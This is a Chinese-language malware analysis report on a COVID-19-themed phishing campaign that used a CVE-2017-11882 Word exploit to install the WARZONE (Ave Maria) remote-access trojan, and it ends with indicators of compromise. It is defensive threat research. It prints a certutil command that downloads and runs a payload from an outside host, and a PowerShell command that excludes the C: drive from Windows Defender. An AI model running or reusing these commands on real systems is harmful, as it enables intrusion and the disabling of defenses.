# 概述

近日，绿盟科技伏影实验室再次发现一起黑客利用新冠疫情实施钓鱼邮件攻击的案例，此次案例的攻击目标为一家位于中国台湾的POS解决方案提供商。

![图片1.png](https://image.3001.net/images/20200330/1585559661_5e81b86d1593a.png!small)![图片2.png](https://image.3001.net/images/20200330/1585559661_5e81b86d16378.png!small)

黑客伪造成美国疾病预防与控制中心发送邮件，实则是通过AOL邮箱发送钓鱼邮件。早在2011年，AOL邮箱就有被报道发送钓鱼邮件的事件。2014年，邮件服务器被黑客攻击，用来发送钓鱼邮件和传播钓鱼网站，后又被勒索软件使用作为联系邮箱。  

此次钓鱼邮件内容和附件名称也与疫情相关，通过邮件内容诱导用户打开并查看附件文档《COVID-19 - nCoV - Special
Update.doc》。打开的文档没有任何内容显示，看似无害，但是实际上包含了CVE-2017-11882的漏洞利用。当收件人打开文档，便会触发漏洞利用。一旦漏洞成功利用，便会下载并启动第一阶段攻击载荷，通过多次资源文件解密之后执行最终的商业化远控木马WARZONE
RAT。

WARZONE RAT是一款功能完善的商业化远控木马软件，有多次进行攻击活动的记录。相关信息显示，WARZONE RAT相关的广告信息最早于2018年出现在
warzone[.]io，目前仍在warzone[.]pw网站提供销售服务。Warzone
RAT木马具备比较完整的远控功能，在后面技术分析部分会进行介绍。WARZONE RAT因为木马文件中存在字符串AVE_MARIA，又被安全厂商识别为Ave
Maria。

![图片3.png](https://image.3001.net/images/20200330/1585559661_5e81b86d1815a.png!small)

2018年12月底，Ave
Maria恶意软件对意大利某能源企业发起网络钓鱼攻击。黑客以供应商销售部的名义发出钓鱼邮件，附带了包含CVE-2017-11882漏洞利用的Excel文件，以运行从恶意网站下载的木马程序。

2019年2月，WARZONE
RAT又发生一起疑似针对西班牙语地区的政府机构及能源企业等部门的定向攻击活动。黑客以应聘者的身份发送诱饵文档，文档以简历更新的标题为诱饵，对目标人力资源部门进行定向攻击，诱使相关人员执行恶意代码，从而控制目标人员机器，从事间谍活动。

2019年11月，研究人员发现思科重定向漏洞被利用，攻击者使用开放重定向漏洞，使得合法站点允许未经授权的用户在该站点上创建URL地址，从而使访问者通过该站点重定向到另外一个站点。黑客将垃圾邮件伪装成WebEx的会议邀请邮件，将其中链接重定向到WARZONE
RAT木马下载链接。一旦运行该木马，受害者的PC将被黑客完全控制。

  

# 攻击流程

本次事件目标邮箱地址在目标企业官网的contact
us部分可以找到，黑客可能是通过访问企业官网确定目标的邮箱地址电话号码等信息。然后伪造发件人向目标邮箱发送钓鱼邮件，诱导收件人查看邮件中带有漏洞利用的邮件附件文档，一旦漏洞成功利用，黑客最终将控制目标PC。

![图片4.png](https://image.3001.net/images/20200330/1585559661_5e81b86d52a63.png!small)

当收件人打开邮件附件文档的时候，会触发漏洞利用下载第一阶段攻击载荷，然后通过多次解密后获得并执行第二阶段第三阶段攻击载荷，第三阶段攻击载荷便是WARZONE
RAT，最终连接C&C服务端等待指令。  

![图片5.png](https://image.3001.net/images/20200330/1585559661_5e81b86d5796f.png!small)

#  

# 技术分析

## DOC文档漏洞利用

邮件附件恶意样本文档被命名为《COVID-19 - nCoV - Special
Update.doc》，利用漏洞CVE-2017-11882执行shellcode:

![图片6.png](https://image.3001.net/images/20200330/1585559661_5e81b86d5ede0.png!small)

shellcode通过WinExec执行命令"CmD /C cErTuTiL -uRlCAchE -sPlIT –f
<http://getegroup.com/file.exe> %TMP%\\\1.exe&start %TMP%\\\1.exe"。

使用CertUtil.exe下载并启动第一阶段攻击载荷1.exe。CertUtil.exe是Windows的内置程序，用于在Windows中管理证书，使用该程序可以在Windows中安装，备份，删除，管理和执行与证书和证书存储相关的各种功能。另外，CertUtil能够从远程URL下载证书或任何其他文件。

## 第一阶段攻击载荷  

第一阶段攻击载荷是一个C#编写的程序，代码经过高度混淆。运行过程中通过解密资源文件CK，在内存里面获得第二阶段攻击载荷DEBFyo.dll，通过Assembly.load
加载第二阶段攻击载荷并调用X()方法。

![图片7.png](https://image.3001.net/images/20200330/1585559661_5e81b86d9168f.png!small)

Re.RA.m('ÿ',1,null,510733617)=“X”

## 第二阶段攻击载荷

第二阶段攻击载荷DEBFyo.dll同样是一个C#编写并经过高度混淆的PE文件，文件包含三个资源文件。第二阶段攻击载荷的功能主要是分别解密这三个资源文件生成第三阶段攻击载荷，并按照执行流程进行调用。

![图片8.png](https://image.3001.net/images/20200330/1585559661_5e81b86db8340.png!small)

## 第三阶段攻击载荷  

第三阶段攻击载荷的三个PE文件：

![9.png](https://image.3001.net/images/20200330/1585559834_5e81b91a7f44a.png!small)  

按照执行流程第一个LOL.dll功能主要是通过查询WMI数据，检查系统版本和AV产品，并在启动目录下创建指向第一阶段攻击载荷的快捷方式Adobe_Process.exe.lnk

![10.png](https://image.3001.net/images/20200330/1585559834_5e81b91a81954.png!small)

其余两个文件一个就是最终的木马程序WARZONE RAT，另外一个26.dll在功能上更像是一个加载模块，负责加载执行木马程序。  

第二阶段攻击载荷在启动加载模块的时候，会将木马程序的二进制内存数据作为参数传入。加载模块在执行过程中，首先会对当前系统环境中的AV产品和操作系统进行检查。

· Directory.Exists

C:\Program Files\AVAST Software

C:\Program Files (x86)\AVAST Software

· Process.GetProcessesByName

BullGuard， a2guard，drweb，vsserv，AVGUI，bdagent，odscanui，bdredline

· detectwd

SELECT Caption FROM Win32_OperatingSystem

检查过后，便是比较重要的部分，加载模块会以挂起状态启动第一阶段攻击载荷，生成一个新进程。然后将WARZONE
RAT木马按照内存对齐写入到这个新进程0x400000开始的地址空间，实现了木马程序进程映像文件的加载，然后通过SetThreadContext和ResumeThread执行WARZONE
RAT木马。

通过SetThreadContext设置指令地址 ：

![11.png](https://image.3001.net/images/20200330/1585559834_5e81b91a8734b.png!small)

# WARZONE RAT

WARZONE RAT是一款通过C++实现的商业远控木马程序，兼容所有的Windows版本，功能非常完善，运行后可以实现对植入机器的完全控制。WARZONE
RAT功能主要包括：

· 远程桌面

· 隐藏的远程桌面-HRDP

· 特权提升-UAC绕过

· 远程网络摄像头

· 窃取密码-支持流行的浏览器和电子邮件客户端（ Chrome, Firefox, Internet Explorer, Edge, Outlook,
Thunderbird, Foxmail）

· 文件管理功能-高速的文件上传下载，支持文件执行和删除

· 实时和离线的键盘记录

· 反向代理

· 自动任务

· 批量管理

· 智能更新

· Windows Defender绕过

WARZONE RAT销售网站上，提供了WARZONE RAT的高级版本WARZONE POISON, 在包含了WARZONE
RAT的全功能同时，增加了隐藏进程、隐藏文件、隐藏启动项、浏览器和远程会话劫持等功能。同时，还提供DOC和EXCEL exploit的定制服务。

WARZONE RAT因为木马文件中存在字符串AVE_MARIA，又被安全厂商识别为Ave Maria。

## 木马功能分析

连接C&C,发送并接收数据：

![12.png](https://image.3001.net/images/20200330/1585559834_5e81b91ac3c59.png!small)

木马传输的数据使用了R**加密算法加密，密钥为“warzone160"：

![13.png](https://image.3001.net/images/20200330/1585559835_5e81b91b159ef.png!small)

下载并执行文件功能：

![14.png](https://image.3001.net/images/20200330/1585559835_5e81b91b52914.png!small)
设置开启远程桌面：

![15.png](https://image.3001.net/images/20200330/1585560046_5e81b9ee6a647.png!small)  
  

特权提升针对不同版本的操作系统使用不同的方法：

1\. 通过添加Windows Defender排除项提升权限

![16.png](https://image.3001.net/images/20200330/1585560046_5e81b9ee6d7aa.png!small)
2\. 通过sdclt.exe提权，当 sdclt.exe 被标准用户权限的进程调用，它会以更高权限运行另一个进程 sdclt.exe。高权限的
sdclt.exe 进程会调用 C:\Windows\System32\control.exe，而control.exe 进程会以更高权限运行，并尝试打开
HKCU\Software\Classes\Folder\shell\open\command 注册表值。

![17.png](https://image.3001.net/images/20200330/1585560046_5e81b9ee70ac2.png!small)

3\. 利用 IFileOperation 漏洞利用提权。

首先设置注册表键值为当前程序路径

![18.png](https://image.3001.net/images/20200330/1585560046_5e81b9eeb0a1e.png!small)

加载自身WM_DSP资源模块，使用pkgmgr.exe进行提权运行注册表中设置的程序路径。

![19.png](https://image.3001.net/images/20200330/1585560046_5e81b9eebd7a1.png!small)

![20.png](https://image.3001.net/images/20200330/1585560046_5e81b9eee953e.png!small)

  

## 窃取密码

窃取Chrome存储的用户信息：

![21.png](https://image.3001.net/images/20200330/1585560151_5e81ba57e7f3a.png!small)

窃取IE存储的用户信息：

![22.png](https://image.3001.net/images/20200330/1585560151_5e81ba57eb8f0.png!small)

窃取FireFox用户信息：

![23.png](https://image.3001.net/images/20200330/1585560151_5e81ba57ef041.png!small)

窃取Outlook用户信息：

![24.png](https://image.3001.net/images/20200330/1585560152_5e81ba58289f6.png!small)

窃取ThunderBird用户信息：

![25.png](https://image.3001.net/images/20200330/1585560152_5e81ba583fcf9.png!small)

窃取FoxMail信息：

![26.png](https://image.3001.net/images/20200330/1585560406_5e81bb5681c29.png!small)

## 键盘记录

键盘记录钩子，记录键盘输入信息：

![27.png](https://image.3001.net/images/20200330/1585560406_5e81bb569814e.png!small)

![28.png](https://image.3001.net/images/20200330/1585560406_5e81bb56a09dd.png!small)

## 部分C&C指令表

![111.png](https://image.3001.net/images/20200330/1585560472_5e81bb989a844.png!small)  

# 事件影响及建议

近日发生的攻击事件表明，黑客不断利用当前新冠疫情的热度，进行钓鱼邮件攻击，投放远控木马。建议用户不要被邮件内容诱惑，随便打开不明来源的邮件附件，另外要更新系统和相关软件，及时安装漏洞补丁。另外企业IT部门可以针对不明来源的可疑邮件进行过滤和拦截，保护企业内部安全。

# IOCs

URL

http[:]//getegroup.com/file.exe

C&C

phantom101.duckdns.org:5200

45.147.231.168

hash:

b720c71bfd199d956e21d8366fcda5dda66a8b085806329e67955925b16a361c

cd25cea911bae68cf7672539cf6d2748753719bd7494bc9330171d83e4330d03

d340edceb10f4986da886264470c85e7e17dc74a76eb7d100c22b9527e32f1a3

cmd

powershell Add-MpPreference -ExclusionPath C: \

CmD /C cErTuTiL -uRlCAchE -sPlIT -f hxxp://getegroup.com/file.exe
%TMP%\\\1.exe&start %TMP%\\\1.exe

strings

warzone160

SELECT * FROM logins

reg

HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings

· MaxConnectionsPer1_0Serve

· MaxConnectionsPerServer

HKCU\Software\\_rptls

·Install

HKLM\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\Winlogon\\\Spec

